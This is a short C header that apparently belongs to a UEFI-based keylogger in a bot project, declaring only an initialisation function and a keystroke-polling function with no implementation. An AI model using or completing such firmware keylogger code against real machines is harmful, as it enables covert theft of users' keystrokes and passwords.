#ifndef SYRIAL_BOT_KEYLOGGER_H
#define SYRIAL_BOT_KEYLOGGER_H

#include <Uefi.h>
#include <Protocol/SimpleTextIn.h>

BOOLEAN InitializeKeylogger(void);
VOID PollKeystrokes(void); 

#endif 
